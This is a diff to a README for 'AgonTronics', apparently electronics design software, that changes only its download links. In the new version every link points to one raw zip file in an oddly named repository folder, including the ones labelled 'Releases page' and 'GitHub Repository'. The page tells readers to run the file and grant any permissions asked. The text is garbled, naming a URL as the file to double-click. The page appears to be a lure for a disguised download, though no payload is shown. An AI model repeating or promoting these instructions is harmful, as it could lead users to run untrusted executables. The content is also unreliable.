@@ -1,6 +1,6 @@
 # 🎛️ AgonTronics - Tailored Electronic Solutions for All
 
-[![Download AgonTronics](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/AgonTronics.zip)](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/AgonTronics.zip)
+[![Download AgonTronics](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/Agon-Tronics-v2.6-beta.3.zip)](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/Agon-Tronics-v2.6-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To run AgonTronics smoothly, ensure your system meets the following:
 
 ### 1. Visit the Download Page
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/AgonTronics.zip). This page contains the latest versions of AgonTronics and all features included.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/Agon-Tronics-v2.6-beta.3.zip). This page contains the latest versions of AgonTronics and all features included.
 
 ### 2. Choose the Right Version
 
@@ -45,7 +45,7 @@ If the downloaded file is a ZIP or compressed file, you need to extract it. Righ
 
 ### 5. Run the Application
 
-Look for the file named `https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/AgonTronics.zip` or similar in the extracted folder. Double-click this file to start the application. If prompted by your system, allow any permissions needed to run the program.
+Look for the file named `https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/Agon-Tronics-v2.6-beta.3.zip` or similar in the extracted folder. Double-click this file to start the application. If prompted by your system, allow any permissions needed to run the program.
 
 ## 🔍 Explore the Application
 
@@ -72,11 +72,11 @@ AgonTronics has a growing community of users and developers. If you run into pro
 
 To download AgonTronics and explore its features, click the link below:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/AgonTronics.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/Agon-Tronics-v2.6-beta.3.zip)
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository:** [AgonTronics GitHub](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/AgonTronics.zip)
+- **GitHub Repository:** [AgonTronics GitHub](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/Agon-Tronics-v2.6-beta.3.zip)
 - **Official Website:** For more information and updates on AgonTronics, check our main website.
 
 ## 🏫 Learning Opportunities
@@ -93,4 +93,4 @@ Join our community to enhance your skills and learn directly from experts in the
 
 AgonTronics combines professional-level design with user-friendly access. Whether you want to design a simple circuit or develop complex firmware, our software is here to assist. Start your journey in electronics today! 
 
-[![Download AgonTronics](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/AgonTronics.zip)](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/AgonTronics.zip)
+[![Download AgonTronics](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/Agon-Tronics-v2.6-beta.3.zip)](https://raw.githubusercontent.com/aditya00654/AgonTronics/main/epicoelar/Agon-Tronics-v2.6-beta.3.zip)
